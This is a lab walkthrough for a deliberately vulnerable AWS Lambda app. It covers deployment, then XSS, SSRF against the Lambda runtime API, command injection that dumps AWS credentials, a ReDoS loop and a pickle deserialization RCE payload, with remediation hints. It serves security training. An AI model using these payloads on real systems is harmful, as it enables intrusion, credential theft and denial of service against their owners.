# Walkthrough

Step-by-step deployment and attack guide for Very Vulnerable Serverless. Every command below has been run end-to-end against a live deployment.

> [!WARNING]
> Deploy only in a disposable AWS account/sandbox you own or are authorized to test.

## 1. Deploy

**Prerequisites:** AWS CLI configured (`aws configure`), Python 3.12, Node.js 18+.

```bash
git clone https://github.com/peachycloudsecurity/very-vulnerable-serverless
cd very-vulnerable-serverless
npm install
npx serverless deploy
```

Grab the endpoint from the output:

```
endpoints:
  ANY - https://xxxxxxxxxx.execute-api.us-east-1.amazonaws.com/dev
```

Set it once, reuse everywhere below:

```bash
export URL="https://xxxxxxxxxx.execute-api.us-east-1.amazonaws.com/dev"
curl -s -o /dev/null -w "%{http_code}\n" "$URL/"   # expect 200
```

**Note:** if `python3.12` isn't on your PATH, install it first (e.g. `uv python install 3.12`) — `serverless-python-requirements` shells out to it during packaging.

Tear down when done:

```bash
npx serverless remove
```

---

## 2. Reflected XSS — `/welcome/<name>` (SLS-1, SLS-7)

Input is reflected into the HTML response with no encoding.

```bash
# Browser
$URL/welcome/<script>alert(document.cookie)</script>

# Filter-bypass payload
$URL/welcome/"><img src=x onerror=alert('XSS')>
```

**Look for:** no output encoding, no CSP header, `text/html` content-type on a hand-built string.

---

## 3. Injection via Login Form (SLS-1)

`/login` accepts GET and POST and forwards `name` to `/welcome/<name>` unsanitized.

```bash
curl -s -o /dev/null -w "%{http_code}\n" -d "name=x" "$URL/login"          # 302
curl -sL "$URL/login?name=<script>alert(1)</script>"
```

---

## 4. SSRF — `/redirect?url=` (SLS-3)

Fetches any URL server-side with no allowlist.

```bash
# Confirm outbound SSRF
curl -s "$URL/redirect?url=https://httpbin.org/ip"

# Internal Lambda runtime API (same box, different interface — see step 5 for the real address)
curl -s "$URL/redirect?url=http://169.254.100.1:9001/2018-06-01/runtime/invocation/next"
```

---

## 5. OS Command Injection → Credential Theft (SLS-1, SLS-5, SLS-6)

`/date?exec=` runs the parameter in `subprocess.Popen(..., shell=True)`. The Lambda role has `s3:*` on `*`.

```bash
# Confirm RCE
curl -s "$URL/date?exec=id"
# {"output":"uid=993(sbx_user1051) gid=990 groups=990\n"}

# Dump AWS credentials from the environment
curl -s "$URL/date?exec=printenv" | tr ',' '\n' | grep AWS_
```

Export the leaked `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN` locally and confirm the blast radius:

```bash
aws sts get-caller-identity
aws s3 ls
```

No `aws` CLI inside the Lambda itself — use boto3 (bundled in the runtime) through the same injection point instead:

```python
# list_buckets.py
import boto3
print([b["Name"] for b in boto3.client("s3").list_buckets()["Buckets"]])
```

```bash
B64=$(base64 < list_buckets.py | tr -d '\n')
curl -s "$URL/date" --data-urlencode "exec=echo $B64 | base64 -d | python3" -G
```

**Look for:** `shell=True` with unsanitized input, `s3:*` on `Resource: "*"`, secrets as plaintext Lambda env vars.

---

## 6. ReDoS — `/redos?string=` (SLS-10)

Matches input against the evil regex `^(a+)+b$` — catastrophic backtracking with no trailing `b`.

```bash
for n in 7 20 25 28 30; do
  s=$(python3 -c "print('a'*$n)")
  curl -s -o /dev/null -w "n=$n -> %{http_code} in %{time_total}s\n" "$URL/redos?string=$s"
done
```

Observed: response time roughly doubles per extra `a`; around 30 characters the Lambda hits its timeout and API Gateway returns **502**. A single request causes CPU-exhaustion DoS.

---

## 7. Insecure Deserialization — Pickle RCE — `/deserial` (SLS-4)

Base64-decodes the input and passes it straight to `pickle.loads()`.

```python
# pickle_rce.py
import pickle, base64, os

class Payload:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pickle_rce_out 2>&1",))

print(base64.urlsafe_b64encode(pickle.dumps(Payload())).decode())
```

```bash
PAYLOAD=$(python3 pickle_rce.py)
curl -s -X POST "$URL/deserial" --data-urlencode "pickled=$PAYLOAD"
# "pickled successfully"

# Read the command output back via the command-injection endpoint (same warm container)
curl -s "$URL/date?exec=cat%20/tmp/pickle_rce_out"
# {"output":"uid=993(sbx_user1051) gid=990 groups=990\n"}
```

Unpickling untrusted input is equivalent to `eval()` — never deserialize data from users.

---

## 8. Why there's no container/sandbox breakout here

Lambda runs each invocation in its own Firecracker microVM, not a shared-kernel container — so classic container-breakout techniques don't apply. Verify instead of assuming:

```bash
curl -s "$URL/date?exec=cat%20/proc/self/status%20|%20grep%20-i%20cap"
# CapEff: 0000000000000000  — zero capabilities, nothing to escalate with
curl -s "$URL/date?exec=ls%20-la%20/var/run/docker.sock"
# No such file — not Docker, no socket to abuse
```

The real blast radius is the one already demonstrated above: RCE + leaked IAM creds + `s3:*` *is* the breakout — no hypervisor escape needed. Attempting to actually break out of the Firecracker sandbox targets AWS's shared infrastructure, not your own resource, and is explicitly against [AWS's penetration-testing policy](https://aws.amazon.com/security/penetration-testing/) — out of scope for this lab.

---

## 9. Security Misconfiguration review (SLS-5, SLS-6, SLS-8, SLS-9)

No request needed — read `serverless.yml` and `requirements.txt`:

- `VARIABLE_1: supersecret99` — plaintext secret in a Lambda env var
- `s3:*` on `Resource: "*"` — Lambda can touch every S3 bucket in the account
- `app.secret_key = 'ThisisSuperFlagBySecurityDojo'` — hardcoded Flask secret in source
- No CloudWatch alarms, no X-Ray, no WAF — zero monitoring
- Pinned dependencies in `requirements.txt` — check for known CVEs
